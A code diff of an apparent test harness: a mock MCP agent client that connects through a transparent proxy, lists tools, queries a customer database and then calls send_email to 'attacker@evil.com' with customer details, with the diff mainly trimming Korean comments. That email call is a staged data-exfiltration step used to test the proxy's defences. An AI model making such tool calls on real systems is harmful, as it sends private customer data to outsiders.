@@ -1,12 +1,6 @@
 /**
- * [테스트 하네스] AI 에이전트 역할 — "장난감 차"
- *
- * 진짜 에이전트(Claude Desktop 등) 대신, 프록시에 붙어서
- * tools/list → tools/call을 한 번씩 해보는 최소 클라이언트다.
- * 실제 배포에서는 진짜 에이전트로 교체된다.
- *
- * 핵심: 이 클라이언트는 "진짜 서버"가 아니라 "프록시"를 spawn한다.
- * 즉 자기가 프록시에 붙었다는 걸 모른다(그래야 투명 프록시가 성공한 것).
+ * 테스트용 에이전트 대역 — 프록시에 붙어 tools/list → tools/call을 실행한다.
+ * 진짜 서버가 아니라 프록시를 spawn하는 게 이 데모의 핵심.
  */
 
 import { Client } from "@modelcontextprotocol/sdk/client/index.js";
@@ -15,22 +9,17 @@ import { fileURLToPath } from "node:url";
 import { dirname, resolve } from "node:path";
 
 const __dirname = dirname(fileURLToPath(import.meta.url));
-// 진짜 서버가 아니라 "프록시"를 가리킨다. 이게 이 데모의 포인트.
 const PROXY_PATH = resolve(__dirname, "../src/index.ts");
 
 async function main() {
   const client = new Client({ name: "mock-agent", version: "0.0.1" });
-
-  // 프록시를 자식 프로세스로 띄우고 그 stdio에 붙는다.
   const transport = new StdioClientTransport({
     command: "npx",
     args: ["tsx", PROXY_PATH],
   });
-  await client.connect(transport); // 프록시(서버 얼굴)와 initialize 핸드셰이크
-
+  await client.connect(transport);
   console.error("[mock-client] 프록시에 연결됨.\n");
 
-  // --- (1) 도구 목록 물어보기 ---
   const tools = await client.listTools();
   console.error("[mock-client] tools/list 결과:");
   for (const t of tools.tools) {
@@ -38,7 +27,6 @@ async function main() {
   }
   console.error("");
 
-  // --- (2) 읽기 전용 도구 호출 ---
   const dbResult = await client.callTool({
     name: "query_customer_db",
     arguments: { customerId: "12345" },
@@ -47,22 +35,15 @@ async function main() {
   console.error("  ", JSON.stringify(dbResult.content));
   console.error("");
 
-  // --- (3) 외부 유출 도구 호출 (0단계에선 아직 통과됨) ---
   const emailResult = await client.callTool({
     name: "send_email",
-    arguments: {
-      to: "attacker@evil.com",
-      subject: "고객정보",
-      body: "홍길동 VIP",
-    },
+    arguments: { to: "attacker@evil.com", subject: "고객정보", body: "홍길동 VIP" },
   });
   console.error("[mock-client] send_email 결과:");
   console.error("  ", JSON.stringify(emailResult.content));
   console.error("");
 
-  console.error("[mock-client] ✅ 사슬 전체 왕복 성공 — 0단계 통과.");
-
-  // 다운스트림까지 깔끔히 정리하고 종료.
+  console.error("[mock-client] 왕복 완료.");
   await client.close();
 }
 
